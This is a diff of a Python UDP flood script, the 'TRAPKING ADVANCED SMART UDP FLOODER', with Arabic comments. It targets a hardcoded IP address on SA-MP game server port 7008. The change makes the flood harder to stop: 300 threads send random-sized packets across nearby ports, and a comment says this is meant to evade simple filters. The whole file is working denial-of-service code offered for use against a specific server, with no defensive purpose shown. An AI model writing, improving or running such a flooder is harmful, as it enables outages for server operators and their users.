@@ -4,52 +4,51 @@ import threading
 import time
 
 # =====================================================================
-# === TRAPKING CLOUD UDP FLOODER (VPS Optimized Edition) ===
+# === TRAPKING ADVANCED SMART UDP FLOODER (Cloud Edition) ===
 # =====================================================================
 
-# ضع هنا الـ IP المستهدف للبورت الخاص بسيرفر الـ SA-MP
 TARGET_IP = "89.46.1.130" 
-TARGET_PORT = 7008          # البورت الافتراضي لـ SA-MP (أو البورت الخاص بالهدف)
-DURATION = 6000               # مدة الضغط بالثواني
-THREADS_COUNT = 800         # عدد الخيوط المتعددة لاستغلال معالج Ryzen 9 بالكامل
+BASE_PORT = 7008            # البورت الأساسي
+PORT_RANGE = 5              # استهداف البورت الأساسي مع بورتات قريبة لإرباك الهدف
+DURATION = 600               # مدة الهجوم بالثواني
+THREADS_COUNT = 300         # رفع عدد الخيوط لاستغلال Ryzen 9 بأقصى طاقة
 
-# توليد حزم بيانات عشوائية وكبيرة نسبياً لإشغال ممر الشبكة
-# سيرفرات SA-MP تستجيب لطلبات معينة أو حزم عشوائية مكثفة
-packet_data = random._urandom(54) # حزمة بحجم 1 كيلوبايت لكل إرسال
-
-def stress_target():
+def smart_stress():
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    
     end_time = time.time() + DURATION
     
-    sent_packets = 0
     while time.time() < end_time:
         try:
-            # إرسال حزم الـ UDP المتتالية بأقصى سرعة ممكنة
-            client.sendto(packet_data, (TARGET_IP, TARGET_PORT))
-            sent_packets += 200
-        except Exception as e:
-            # في حال حدث أي ضغط على السوكت، نكمل الإرسال بدون توقف
+            # توليد حجم وبصمة عشوائية للحزمة في كل مرة لتفادي الفلاتر البسيطة
+            packet_size = random.randint(512, 1400)
+            packet_data = random._urandom(packet_size)
+            
+            # اختيار بورت عشوائي ضمن النطاق المستهدف
+            target_port = BASE_PORT + random.randint(0, PORT_RANGE)
+            
+            client.sendto(packet_data, (TARGET_IP, target_port))
+        except:
             pass
             
     client.close()
 
 def main():
-    print(f"[*] جاري بدء عملية الضغط على السيرفر المستهدف: {TARGET_IP}:{TARGET_PORT}")
-    print(f"[*] استخدام {THREADS_COUNT} خيط (Threads) لاستغلال قوة المعالج السحابي...")
+    print(f"[*] بدء الهجوم الذكي والموزع على الهدف: {TARGET_IP}")
+    print(f"[*] النطاق المستهدف للبورتات: من {BASE_PORT} إلى {BASE_PORT + PORT_RANGE}")
+    print(f"[*] تشغيل {THREADS_COUNT} خيط ذكي عبر الـ VPS...")
     
     threads = []
-    
-    # تشغيل الخيوط بالتوازي
     for _ in range(THREADS_COUNT):
-        t = threading.Thread(target=stress_target)
+        t = threading.Thread(target=smart_stress)
         threads.append(t)
         t.start()
         
-    # الانتظار حتى تنتهي المدة المحددة
     for t in threads:
         t.join()
         
-    print("\n[+] انتهت عملية الضغط الميداني.")
+    print("\n[+] انتهت الجلسة الذكية.")
 
 if __name__ == "__main__":
     main()
